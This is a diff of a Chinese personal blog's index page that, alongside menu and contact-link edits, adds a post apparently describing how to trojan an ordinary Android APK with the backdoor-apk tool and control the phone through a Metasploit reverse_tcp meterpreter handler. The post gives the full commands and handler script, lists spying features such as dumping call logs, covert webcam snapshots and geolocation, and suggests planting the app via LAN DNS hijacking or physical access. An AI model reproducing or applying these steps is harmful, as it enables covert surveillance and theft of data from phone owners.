@@ -57,6 +57,8 @@
 	        
 				<li><a href="/archives">归档</a></li>
 	        
+				<li><a href="/about">关于</a></li>
+	        
 			</ul>
 		</nav>
 		<nav class="header-smart-menu">
@@ -78,6 +80,8 @@
 			<div class="social">
 				
 					<a class="github" target="_blank" href="https://github.com/xiaoTaoist" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="mail" target="_blank" href="mailto:taoist@protonmail.com" title="mail"><i class="icon-mail"></i></a>
 		        
 					<a class="rss" target="_blank" href="/atom.xml" title="rss"><i class="icon-rss"></i></a>
 		        
@@ -109,6 +113,8 @@
 			
 				
 			
+				
+			
 			
 			
 			<nav class="header-nav">
@@ -116,18 +122,22 @@
 					
 						<a class="github" target="_blank" href="https://github.com/xiaoTaoist" title="github"><i class="icon-github"></i></a>
 			        
+						<a class="mail" target="_blank" href="mailto:taoist@protonmail.com" title="mail"><i class="icon-mail"></i></a>
+			        
 						<a class="rss" target="_blank" href="/atom.xml" title="rss"><i class="icon-rss"></i></a>
 			        
 				</div>
 			</nav>
 
 			<nav class="header-menu js-header-menu">
-				<ul style="width: 50%">
+				<ul style="width: 70%">
 				
 				
-					<li style="width: 50%"><a href="/">主页</a></li>
+					<li style="width: 33.333333333333336%"><a href="/">主页</a></li>
 		        
-					<li style="width: 50%"><a href="/archives">归档</a></li>
+					<li style="width: 33.333333333333336%"><a href="/archives">归档</a></li>
+		        
+					<li style="width: 33.333333333333336%"><a href="/about">关于</a></li>
 		        
 				</ul>
 			</nav>
@@ -143,6 +153,123 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    <article id="post-backdoor-apk" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/02/backdoor-apk/">生成apk后门实现msf控制安卓手机</a>
+    </h1>
+  
+
+        
+        <a href="/2018/03/02/backdoor-apk/" class="archive-article-date">
+  	<time datetime="2018-03-02T10:00:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>========================</p>
+<hr>
+<h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><ul>
+<li>Kali Linux</li>
+<li>android</li>
+<li>同一局域网 </li>
+</ul>
+<h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>安装依赖环境</p>
+<blockquote>
+<p>apt-get install lib32z1 lib32ncurses5  lib32stdc++6</p>
+</blockquote>
+<p>下载 backdoor-apk</p>
+<blockquote>
+<p>git clone <a href="https://github.com/dana-at-cp/backdoor-apk.git" target="_blank" rel="noopener">https://github.com/dana-at-cp/backdoor-apk.git</a></p>
+</blockquote>
+<p>下载完成后进入文件目录</p>
+<blockquote>
+<p>cd backdoor-apk/backdoor-apk</p>
+</blockquote>
+<p>将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行</p>
+<blockquote>
+<p>./backdoor-apk.sh test.apk<br>PS:test.apk 为事先准备好的正常apk应用名</p>
+</blockquote>
+<p>选择payload<br><img src="img/apk_1.png" alt="apk">  </p>
+<p>出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件</p>
+<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>执行</p>
+<blockquote>
+<p>msfconsole -r backdoor-apk.rc</p>
+</blockquote>
+<p>手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell<br><img src="img/apk_msf.png" alt="msf"><br>可以看到获得反弹shell 会话<br>用sessions -i number  切换到当前会话<br>此处执行check_root 测试<br>其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等</p>
+<p>可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set payload android/meterpreter/reverse_tcp  </span><br><span class="line">set lhost 192.168.0.105  </span><br><span class="line">set lport 8888  </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol>
+<li>[!] Failed to recompile original project with backdoor <ul>
+<li>现在很多应用都会做一些处理防止反编译，可以上 <a href="https://apkpure.com" target="_blank" rel="noopener">APKPure</a> 或<a href="https://www.coolapk.com" target="_blank" rel="noopener">酷安</a> 去找一些历史版本会增加成功概率</li>
+<li>apktools 过旧，可以把Kail 更到最新</li>
+<li>一定要把 apk 放到backdoor-apk.sh 所在目录下</li>
+</ul>
+</li>
+</ol>
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul>
+<li>外网环境可使用vps转发 或 ngrok穿透 参考<ul>
+<li>vps 转发 <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li>
+<li>ngrok穿透 <a href="http://www.freebuf.com/sectool/162046.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/162046.html</a></li>
+</ul>
+</li>
+<li>植入木马方式<ul>
+<li>内网dns劫持: <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li>
+<li>物理接触</li>
+</ul>
+</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://www.secist.com/archives/680.html" target="_blank" rel="noopener">http://www.secist.com/archives/680.html</a></li>
+<li><a href="http://www.4hou.com/mobile/8290.html" target="_blank" rel="noopener">http://www.4hou.com/mobile/8290.html</a></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/03/02/backdoor-apk/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
   
     <article id="post-Vimium-use" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -391,7 +518,7 @@
     		&copy; 2018 taoist
     	</div>
       	<div class="footer-right">
-      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+					<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
       	</div>
     </div>
   </div>
@@ -538,7 +665,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
     
     	<section class="tools-section tools-section-me" q-show="aboutme">
   	  	
-  	  		<div class="aboutme-wrap" id="js-aboutme">人若无名，便可专心练剑&lt;br&gt;&lt;br&gt;&lt;br&gt;</div>
+  	  		<div class="aboutme-wrap" id="js-aboutme">人若无名，便可专心练剑&lt;br&gt;&lt;br&gt;taoist@protonmail.com&lt;br&gt;</div>
   	  	
     	</section>
     
